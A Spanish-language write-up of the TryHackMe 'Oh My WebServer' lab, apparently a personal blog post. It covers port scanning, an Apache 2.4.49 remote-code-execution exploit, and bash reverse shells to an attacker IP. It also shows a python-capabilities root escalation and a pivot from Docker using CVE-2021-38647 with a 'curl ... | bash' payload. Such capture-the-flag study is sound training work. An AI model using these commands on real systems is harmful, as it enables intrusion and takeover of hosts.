---
title: "Oh My WebServer"
description: "Oh My WebServer"
pubDate: 2025-05-20
---

**https**://tryhackme.com/r/room/ohmyweb

# Fase de reconocimiento

## Buscamos puertos abiertos

````
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.146.85
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240520013051.png)

## Reconocimiento de servicios

````
nmap -sCV -p22,80 10.10.146.85
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240520013248.png)

## Fuzzing

````
dirb http://10.10.146.85
````

Wappalyzer
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240520015826.png)

## Buscar vulnerabilidades

````
searchsploit apache 2.4.49
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240520020117.png)
Encontramos un RCE

# Fase de ataque

## RCE

1. Usamos el exploit

````
searchsploit -m multiple/webapps/50383.sh
````

2. Nos ponemos en escucha por el puerto 443

````
nc -nlvp 443
````

3. Mandamos la Reverse Shell

````
./exploit.sh http /bin/bash bash -i >& /dev/tcp/10.9.0.14/443 0>&1
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240520020929.png)
\[-\] ==pwned!==

## Ajustar terminal

````
script /dev/null -c bash
````

ctrl + z

````
stty raw -echo; fg
````

````
	reset xterm
````

````
export TERM=xterm
````

````
stty rows 44 columns 184
````

Parece que estamos dentro de un Docker

# Privilege Escalation

## Docker

Encontramos un python con capabilities activadas

````
getcap -r / 2>/dev/null
````

Buscamos en en [gtfobins.](https://gtfobins.github.io/gtfobins/python/) Capabilities

````
python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240520022755.png)
\[-\] ==pwned!==
Para volver a bash normal

````
/bin/bash -p 
````

## Pivoting

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240520025931.png)
Movemos nmap al docker

1. Nos descargamos el nmap
   https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
1. Abrimos un servidor HTTP para compartir el archivo

````
python3 -m http.server 80
````

3. Desde la maquina victima lo descargamos

````
curl -v http://10.9.0.14/nmap -o nmap
````

4. Lo volvemos ejecutable

````
chmod +x ./nmap
````

5. Host Discovery
5. Miramos los puertos abiertos

````
./nmap -p- --min-rate 5000 172.17.0.1
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240520032307.png)
Los puertos 5985 y 5986 tiene un CVE de RCE as root

1. Nos descargamos el exploit

````
git clone https://github.com/horizon3ai/CVE-2021-38647
````

2. Abrimos un servidor HTTP para compartir el archivo

````
python3 -m http.server 80
````

3. Desde la maquina victima lo descargamos

````
curl -v http://10.9.0.14/omigod.py -o omigod.py
````

5. Nos ponemos en escucha por el puerto 1111

````
nc -nlvp 1111
````

6. Mandamos la Reverse Shell

````
echo 'bash -i >& /dev/tcp/10.9.0.14/1111 0>&1' > shell.sh
python3 -m http.server 80

python3 omigod.py -t 172.17.0.1 -c 'curl http://10.9.0.14/shell.sh | bash'
````

\[+\] ==pwned!==
